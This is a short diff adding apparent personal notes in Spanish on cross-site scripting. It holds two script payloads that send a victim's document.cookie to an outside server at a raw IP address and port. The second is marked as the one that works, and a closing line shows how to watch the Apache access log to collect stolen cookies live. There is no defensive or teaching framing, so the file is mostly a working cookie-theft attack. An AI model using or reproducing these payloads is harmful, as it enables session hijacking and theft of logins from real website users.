@@ -1,0 +1,9 @@
+xss
+
+<script>document.write('<img src='http://83.34.18.159:8081/index.php?cookie=' + document.cookie + '">')</script>
+
+este sí funciona->
+<script> var i = new Image(); i.src="http://83.34.18.159:8081/index.php?cookie="+escape(document.cookie)</script>
+
+para ver la respuesta, se puede hacer en tiempo real abriendo el archivo:
+#tail -f /var/log/apache2/access.log
